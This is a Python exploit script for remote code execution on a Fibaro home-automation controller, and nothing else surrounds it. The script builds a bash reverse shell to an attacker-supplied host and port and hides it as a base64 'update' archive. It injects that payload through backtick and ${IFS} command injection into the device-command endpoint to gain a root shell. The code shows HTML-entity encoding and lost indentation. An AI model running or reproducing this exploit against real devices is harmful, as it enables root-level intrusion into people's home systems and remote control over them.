 
import requests
import argparse
import urllib
import base64
import tarfile
import os
 
parser = argparse.ArgumentParser(description=&#039;Fibaro RCE&#039;)
parser.add_argument(&#039;--rhost&#039;)
parser.add_argument(&#039;--lhost&#039;)
parser.add_argument(&#039;--lport&#039;)
args = parser.parse_args()
 
f = open(&#039;run.sh&#039;, &#039;w&#039;)
f.write(&#039;#!/bin/bash\n&#039;)
f.write(&#039;/bin/bash -i >& /dev/tcp/&#039; + args.lhost + &#039;/&#039; + args.lport + &#039; 0>&1\n&#039;)
f.close()
 
os.chmod(&#039;run.sh&#039;, 0777)
 
tar = tarfile.open("root.tar.gz", "w:gz")
tar.add("run.sh")
tar.close()
 
with open("root.tar.gz", "rb") as tarfile:
tar64 = base64.b64encode(tarfile.read())
 
wwwexec = urllib.quote_plus(base64.b64encode("echo &#039;" + tar64 + "&#039; | base64 -d > /tmp/patch.tar.gz && sudo update --manual /tmp/patch.tar.gz"))
 
os.remove(&#039;run.sh&#039;)
os.remove(&#039;root.tar.gz&#039;)
 
headers = {
&#039;User-Agent&#039;: &#039;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0&#039;,
&#039;Content-Type&#039;: &#039;application/x-www-form-urlencoded; charset=UTF-8&#039;,
&#039;X-Fibaro-Version&#039;: &#039;2&#039;,
&#039;X-Requested-With&#039;: &#039;XMLHttpRequest&#039;,
}
 
data = &#039;deviceID=1&deviceName=&deviceType=&cmd1=`echo${IFS}&#039; + wwwexec + &#039;|base64${IFS}-d|/bin/bash`&cmd2=&roomID=1&roomName=&sectionID=&sectionName=&lang=en&#039;
print "[+] Popping a root shell..."
 
requests.post(&#039;http://&#039; + args.rhost + &#039;/services/liliSetDeviceCommand.php&#039;, headers=headers, data=data, verify=False)

